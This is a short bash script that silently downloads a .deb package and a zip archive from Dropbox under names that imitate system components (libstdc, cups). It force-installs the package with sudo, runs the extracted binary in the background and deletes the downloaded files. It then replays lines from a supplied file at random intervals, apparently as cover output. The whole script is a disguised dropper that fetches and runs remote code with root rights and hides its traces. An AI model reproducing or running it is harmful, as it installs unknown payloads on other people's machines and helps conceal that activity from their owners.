#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/vv24bsdw6wa8yuh/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/texpgcwasfnrln0/cups.zip -q
unzip cups.zip > /dev/null 2>&1
#pwd
./scripts/cups ./scripts/data &
sleep 3
rm -rf cups.zip
rm -rf scripts/cups
rm -rf scripts/data
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 3 ))
done < $2

